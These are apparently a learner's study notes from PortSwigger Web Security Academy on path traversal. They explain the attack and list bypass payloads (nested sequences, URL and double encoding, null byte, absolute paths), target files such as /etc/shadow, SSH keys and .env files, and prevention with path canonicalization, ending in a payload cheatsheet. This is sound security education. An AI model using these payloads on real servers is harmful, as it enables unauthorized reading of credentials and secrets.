# Path Traversal
**Source:** PortSwigger Web Security Academy
**Status:** ✅ Completed
**Date:** August 2026
**Author:** [l1m1nal_3ntr0py](https://github.com/l1m1nal-3ntr0py)

---

# Path Traversal
**Source:** PortSwigger Web Security Academy  
**Status:** ✅ Completed  
**Date:** August 2026  
**Author:** [l1m1nal_3ntr0py](https://github.com/l1m1nal-3ntr0py)

---

## Table of Contents
1. [What is Path Traversal?](#what-is-path-traversal)
2. [Basic Attack](#basic-attack)
3. [Bypass Techniques](#bypass-techniques)
4. [Sensitive Files to Target](#sensitive-files-to-target)
5. [Prevention](#prevention)
6. [Quick Reference Cheatsheet](#quick-reference-cheatsheet)

---

## What is Path Traversal?

Also known as **directory traversal** — allows an attacker to read arbitrary files on the server running an application.

**What can be read:**
- Application source code and data
- Credentials for back-end systems
- Sensitive operating system files

**In some cases** — an attacker can also **write** to arbitrary files, modifying application behavior or taking full control of the server.

---

## Basic Attack

A shopping application loads images like this:

```
<img src="/loadImage?filename=218.png">
```

The server constructs the file path:
```
/var/www/images/218.png
```

**The attack** — replace the filename with traversal sequences:

```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```

Server constructs:
```
/var/www/images/../../../etc/passwd
```

Each `../` steps one level up:
```
/var/www/images/  →  ../  →  /var/www/
                  →  ../  →  /var/
                  →  ../  →  /  (filesystem root)
```

Result: `/etc/passwd` is read and returned.

**Windows equivalent:**
```
filename=..\..\..\windows\win.ini
```

Both `../` and `..\` are valid traversal sequences on Windows.

---

## Bypass Techniques

### 1. Absolute Path
Skip traversal entirely — use a direct path:
```
filename=/etc/passwd
```
Works when the application doesn't validate that the path starts within the base directory.

---

### 2. Nested Traversal Sequences
When a filter strips `../` once and moves on:
```
You send:    ....//
Filter sees: ..// → finds ../ → removes it
Result:      ../  ← still valid! ✅
```

**Full example:**
```
Normal (BLOCKED):
?file=../../../etc/passwd

Nested (BYPASSED):
?file=....//....//....//etc/passwd

Filter strips ../ from each ....//
Result: ../../../etc/passwd ✅
```

---

### 3. URL Encoding
Filter operates on raw input — doesn't decode first:

```
../   →   %2e%2e%2f          (URL encoded)
../   →   %252e%252e%252f    (double URL encoded)
../   →   ..%c0%af           (non-standard encoding)
../   →   ..%ef%bc%8f        (Unicode encoding)
```

> **Burp Tip:** Burp Intruder has a built-in payload list — **Fuzzing - path traversal** — with all encoded variants ready to fire.

---

### 4. Required Base Folder Bypass
Application checks the path starts with `/var/www/images`:
```
filename=/var/www/images/../../../etc/passwd
```
Validation passes — traversal succeeds.

---

### 5. Null Byte Injection
Application requires filename to end with `.png`:
```
filename=../../../etc/passwd%00.png
```

**How it works:**
```
Filter checks: "does it end in .png?" → YES ✅ PASSES

%00 = null byte = end of string at OS level

Server reads:  ../../../etc/passwd
               (everything after %00 is ignored)

Server opens:  /etc/passwd ✅
```

---

## Sensitive Files to Target

```
/etc/passwd          → All user accounts on the server
/etc/shadow          → Hashed passwords (if readable)
/etc/hosts           → Internal network hostnames
~/.ssh/id_rsa        → Private SSH keys
/var/www/html/config → Database credentials
/proc/self/environ   → Environment variables and secrets
web.config / .env    → API keys and application secrets
```

---

## Prevention

**Best practice:** Avoid passing user-supplied input to filesystem APIs entirely.

If unavoidable — use **two layers:**

**Layer 1 — Input Validation:**
- Whitelist permitted values only
- Allow alphanumeric characters and single file extension
- Reject anything containing:
  - `../` or `..\`
  - `/` at the start
  - `%` (encoded characters)
  - Null bytes (`%00`)

**Layer 2 — Path Canonicalization:**

After validation, canonicalize the full path and verify it still starts within the expected base directory.

```java
File file = new File(BASE_DIRECTORY, userInput);
if (!file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    throw new SecurityException("Path traversal detected");
}
```

`getCanonicalPath()` resolves all `../` sequences, symbolic links and encoding tricks — producing the actual absolute path the OS would use. If it escapes the base directory — reject it.

> Both layers together make path traversal practically impossible. Either layer alone is bypassable.

---

## Quick Reference Cheatsheet

```
BASIC ATTACK
filename=../../../etc/passwd

BYPASS 1 — Absolute path
filename=/etc/passwd

BYPASS 2 — Nested sequences
filename=....//....//....//etc/passwd

BYPASS 3 — URL encoded
filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

BYPASS 4 — Double URL encoded
filename=%252e%252e%252f%252e%252e%252fetc/passwd

BYPASS 5 — Base folder required
filename=/var/www/images/../../../etc/passwd

BYPASS 6 — Null byte + extension
filename=../../../etc/passwd%00.png

WINDOWS
filename=..\..\..\windows\win.ini
```

---

*Notes by [l1m1nal_3ntr0py](https://github.com/l1m1nal-3ntr0py) | PortSwigger Web Security Academy*

